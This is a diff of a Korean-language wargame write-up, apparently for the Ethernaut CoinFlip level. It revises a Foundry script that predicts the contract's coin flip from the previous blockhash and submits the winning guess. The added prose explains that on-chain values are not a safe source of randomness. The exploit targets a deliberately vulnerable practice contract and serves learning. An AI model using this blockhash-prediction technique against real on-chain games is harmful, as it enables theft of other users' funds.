@@ -21,30 +21,32 @@ pragma solidity ^0.8.0;
 import {Script, console} from "forge-std/Script.sol";
 import {CoinFlip} from "../src/EN_3_CoinFlip.sol";
 
-contract Player {
-  uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-
-  constructor (CoinFlip prob) {
-    uint blockValue = uint(blockhash(block.number - 1));
-    uint coinflip = blockValue / FACTOR;
-    bool guess = coinflip == 1 ? true : false;
-    prob.flip(guess);
-  }
-}
-
 contract EN_3 is Script {
-    CoinFlip public ctrt = CoinFlip(payable(0x94099942864EA81cCF197E9D71ac53310b1468D8));
+    CoinFlip public ctrt = CoinFlip(payable(0x06B1D212B8da92b83AF328De5eef4E211Da02097));
 
 
     function run() public {
+        uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
         vm.startBroadcast(vm.envUint("PRIV_KEY"));
+        uint blockValue = uint(blockhash(vm.getBlockNumber() - 1));
+        console.log(vm.getBlockNumber());
+        console.log(block.number);
 
-        new Player(ctrt);
+        uint coinflip = blockValue / FACTOR;
+        bool guess = coinflip == 1 ? true : false;
+        ctrt.flip(guess);
+
         console.log("Win count:", ctrt.consecutiveWins());
-
         vm.stopBroadcast();
     }
 }
 ```
 
-(wip)
+문제의 로직을 그대로 들고와서 똑같이 계산해주면 되는 문제입니다.
+on-chain data를 기반으로 random value를 생성하는건 하면 안되는 문제입니다.
+
+---
+
+## 여담
+10번 반복해야 하는 문제라서, `for` 를 넣으면 쉽게 해결되지 않을까 생각했는데, 스크립트 실행 한 번이 Tx 한 번을 날리는 것 같습니다. (같은 block.number를 계속 사용합니다)
